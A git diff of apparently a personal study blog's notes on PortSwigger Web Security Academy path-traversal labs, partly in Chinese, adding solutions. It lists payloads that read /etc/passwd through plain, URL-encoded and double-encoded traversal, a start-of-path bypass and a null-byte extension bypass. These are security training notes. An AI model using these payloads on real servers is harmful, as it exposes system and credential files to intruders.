@@ -1,6 +1,8 @@
 ---
 title: Path traversal
 description: Path traversal
+last_update:
+  date: "2025-09-11T08:00:00+08:00"
 ---
 
 ## Lab: File path traversal, simple case
@@ -58,6 +60,61 @@ https://0aab00f703a0e8418241bac5006000f6.web-security-academy.net/image?filename
 | --------- | ---------------------------------------------------------------------------------------------------------------------- |
 | Document  | https://portswigger.net/web-security/file-path-traversal#common-obstacles-to-exploiting-path-traversal-vulnerabilities |
 | Lab       | https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode                                    |
+
+1.
+
+```
+../../../etc/passwd
+..%2F..%2F..%2Fetc%2Fpasswd
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+```
+
+`"No such file"`
+
+2. double encode `%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd`
+
+## Lab: File path traversal, validation of start of path
+
+| Dimension | Description                                                                                                            |
+| --------- | ---------------------------------------------------------------------------------------------------------------------- |
+| Document  | https://portswigger.net/web-security/file-path-traversal#common-obstacles-to-exploiting-path-traversal-vulnerabilities |
+| Lab       | https://portswigger.net/web-security/file-path-traversal/lab-validate-start-of-path                                    |
+
+`/var/www/images/../../../etc/passwd`
+
+## Lab: File path traversal, validation of file extension with null byte bypass
+
+| Dimension | Description                                                                                                            |
+| --------- | ---------------------------------------------------------------------------------------------------------------------- |
+| Document  | https://portswigger.net/web-security/file-path-traversal#common-obstacles-to-exploiting-path-traversal-vulnerabilities |
+| Lab       | https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass                  |
+
+null byte
+
+```js
+// Hexadecimal escape sequence
+const nullByte1 = "\x00";
+
+// Unicode escape sequence
+const nullByte2 = "\u0000";
+
+// Character code
+const nullByte3 = String.fromCharCode(0);
+
+// 驗證它們都相同
+console.log(nullByte1 === nullByte2); // true
+console.log(nullByte1 === nullByte3); // true
+console.log(nullByte1.charCodeAt(0)); // 0
+
+// Encode Null Byte
+encodeURIComponent(String.fromCharCode(0)); // %00
+```
+
+`../../../etc/passwd%00.jpg`
+
+## 小結
+
+Path Traversal 的 Labs 一下子就沒了，但有學到一些新的技巧，算是有收穫，這個系列的 Labs 沒有 Expert 等級的，可能是因為 Path Traversal 比較單純（？
 
 ## 參考資料
 
